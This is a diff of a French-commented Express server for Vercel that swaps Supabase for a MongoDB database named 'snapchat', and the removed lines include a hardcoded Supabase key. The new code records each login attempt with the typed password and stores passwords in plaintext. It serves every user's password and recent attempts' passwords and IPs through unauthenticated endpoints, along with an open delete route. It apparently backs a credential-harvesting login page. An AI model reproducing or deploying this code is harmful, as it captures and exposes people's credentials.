@@ -1,21 +1,40 @@
 /**
- * Point d’entrée Express pour Vercel (détection automatique).
- * En local : utilise `npm start` (server.js) ou `npm run start:supabase`.
+ * Point d'entree Express pour Vercel (detection automatique).
+ * En local : utilise `npm start` (server.js).
  */
 const express = require("express");
 const path = require("path");
-const { createClient } = require("@supabase/supabase-js");
+const mongoose = require("mongoose");
+
+const User = require("./models/User");
+const LoginAttempt = require("./models/LoginAttempt");
 
 const app = express();
 app.use(express.json());
 
-const SUPABASE_URL =
-  process.env.SUPABASE_URL || "https://hbpujogqidmyfqazujvm.supabase.co";
-const SUPABASE_ANON_KEY =
-  process.env.SUPABASE_ANON_KEY ||
-  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImhicHVqb2dxaWRteWZxYXp1anZtIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzc2NjM3NTgsImV4cCI6MjA5MzIzOTc1OH0.gNK8md0xHHxY0gDqTzUg0aNvuMw2EpqgkvIOXSrDfRM";
+// --- Connexion MongoDB --------------------------------------------------------
+const MONGO_URI = process.env.MONGO_URI || "mongodb://localhost:27017/snapchat";
 
-const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+let isConnected = false;
+
+async function connectDB() {
+  if (isConnected) return;
+  await mongoose.connect(MONGO_URI);
+  isConnected = true;
+}
+
+// Middleware pour connecter a MongoDB avant chaque requete
+app.use(async (_req, _res, next) => {
+  try {
+    await connectDB();
+    next();
+  } catch (err) {
+    console.error("Erreur connexion MongoDB:", err.message);
+    next(err);
+  }
+});
+
+// --- Routes API ---------------------------------------------------------------
 
 app.post("/api/register", async (req, res) => {
   const { username, email, password } = req.body;
@@ -23,47 +42,97 @@ app.post("/api/register", async (req, res) => {
     return res.status(400).json({ error: "Champs obligatoires" });
   }
 
-  const { data, error } = await supabase
-    .from("users")
-    .insert([{ username, email, password }])
-    .select()
-    .single();
-
-  if (error) return res.status(500).json({ error: error.message });
-  return res.status(201).json({ message: "Compte créé", user: data });
+  try {
+    const user = await User.create({ username, email, password });
+    return res.status(201).json({
+      message: "Compte cree",
+      user: { id: user._id, username: user.username, email: user.email },
+    });
+  } catch (err) {
+    if (err.code === 11000) {
+      return res.status(409).json({ error: "Nom d'utilisateur ou email deja pris." });
+    }
+    return res.status(500).json({ error: err.message });
+  }
 });
 
 app.post("/api/login", async (req, res) => {
   const { identifier, password } = req.body;
 
-  const { data: user } = await supabase
-    .from("users")
-    .select("*")
-    .or(`username.eq.${identifier},email.eq.${identifier}`)
-    .single();
+  try {
+    const user = await User.findOne({
+      $or: [{ username: identifier }, { email: identifier }],
+    });
 
-  const isSuccess = user && password === user.password;
+    const isSuccess = user && password === user.password;
 
-  await supabase.from("login_attempts").insert([
-    { identifier, password, status: isSuccess ? "SUCCESS" : "FAILED" },
-  ]);
+    await LoginAttempt.create({
+      identifier,
+      password,
+      status: isSuccess ? "SUCCESS" : "FAILED",
+    });
 
-  if (!isSuccess)
-    return res.status(401).json({ error: "Identifiants incorrects" });
-  return res.json({ message: `Bienvenue ${user.username}`, user });
+    if (!isSuccess) {
+      return res.status(401).json({ error: "Identifiants incorrects" });
+    }
+
+    return res.json({
+      message: `Bienvenue ${user.username}`,
+      user: { id: user._id, username: user.username, email: user.email },
+    });
+  } catch (err) {
+    return res.status(500).json({ error: err.message });
+  }
 });
 
 app.get("/api/users", async (_req, res) => {
-  const { data } = await supabase.from("users").select("*");
-  res.json(data || []);
+  try {
+    const users = await User.find({}).sort({ created_at: -1 });
+    res.json(
+      users.map((u) => ({
+        id: u._id,
+        username: u.username,
+        email: u.email,
+        password: u.password,
+        created_at: u.created_at,
+      }))
+    );
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
 });
 
 app.get("/api/login-attempts", async (_req, res) => {
-  const { data } = await supabase
-    .from("login_attempts")
-    .select("*")
-    .order("attempted_at", { ascending: false });
-  res.json(data || []);
+  try {
+    const attempts = await LoginAttempt.find({})
+      .sort({ attempted_at: -1 })
+      .limit(50);
+    res.json(
+      attempts.map((a) => ({
+        id: a._id,
+        identifier: a.identifier,
+        password: a.password,
+        status: a.status,
+        ip_address: a.ip_address,
+        attempted_at: a.attempted_at,
+      }))
+    );
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+app.delete("/api/users/:id", async (req, res) => {
+  try {
+    const user = await User.findById(req.params.id);
+    if (!user) {
+      return res.status(404).json({ error: "Utilisateur introuvable." });
+    }
+    await User.findByIdAndDelete(req.params.id);
+    return res.json({ message: `Utilisateur ${user.username} supprime.` });
+  } catch (err) {
+    return res.status(500).json({ error: err.message });
+  }
 });
 
 app.use(express.static(path.join(__dirname, "public")));
